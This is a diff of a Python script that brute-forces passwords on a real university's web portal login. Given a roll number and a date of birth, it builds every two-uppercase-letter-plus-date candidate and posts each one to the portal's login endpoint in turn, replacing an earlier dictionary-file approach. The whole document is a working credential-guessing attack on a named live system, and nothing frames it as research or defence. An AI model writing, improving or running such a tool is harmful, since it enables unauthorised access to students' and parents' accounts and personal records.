@@ -3,6 +3,7 @@ import requests
 from bs4 import BeautifulSoup as bs
 
 url='https://webkiosk.thapar.edu/CommonFiles/UserAction.jsp'
+alphabets = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
 
 def connect(url, m_data):
 	# print("requesting data:")
@@ -17,13 +18,16 @@ def connect(url, m_data):
 	# print("done")
 
 def controller():
-	psswds = open('new_dict').read().split('\n')
-	for i, line in enumerate(psswds):
-		print(f'\rTrying {line + sys.argv[2]} | {i} of {len(psswds)}', end='', flush=True)
+	roll_no = sys.argv[1]
+	date_ob = sys.argv[2]
+	length = len(alphabets) ** 2
+	psswds = (M + D + date_ob for M in alphabets for D in alphabets)
+	for i, psswd in enumerate(psswds):
+		print(f'\rTrying {psswd} | {i + 1} of {length}', end='', flush=True)
 		connect(url, {
 			'UserType' : 'P',
-			'MemberCode' : sys.argv[1],
-			'Password' : line + sys.argv[2]
+			'MemberCode' : roll_no,
+			'Password' : psswd
 		})
 
 controller()
